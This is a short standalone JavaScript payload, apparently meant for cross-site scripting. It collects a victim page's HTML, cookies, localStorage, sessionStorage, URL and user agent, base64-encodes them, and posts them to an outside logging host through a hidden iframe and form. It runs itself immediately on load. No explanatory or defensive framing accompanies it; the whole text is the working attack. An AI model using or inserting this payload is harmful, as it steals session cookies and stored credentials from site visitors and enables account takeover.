function collectAndSend() {
  // Grab all data
  const html = document.documentElement.outerHTML;
  const cookies = document.cookie;
  const local = JSON.stringify(localStorage);
  const session = JSON.stringify(sessionStorage);

  // Combine all into a single object
  const payload = {
    html,
    cookies,
    local,
    session,
    url: location.href,
    ua: navigator.userAgent,
  };

  // Base64-encode it
  const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));

  // Create a hidden iframe to prevent redirect
  const iframe = document.createElement("iframe");
  iframe.name = "xsteal";
  iframe.style.display = "none";
  document.body.appendChild(iframe);

  // Build and send form
  const form = document.createElement("form");
  form.action = "https://xlx.sh/log";
  form.method = "POST";
  form.target = "xsteal";

  const input = document.createElement("input");
  input.name = "data";
  input.value = encoded;

  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}

collectAndSend();
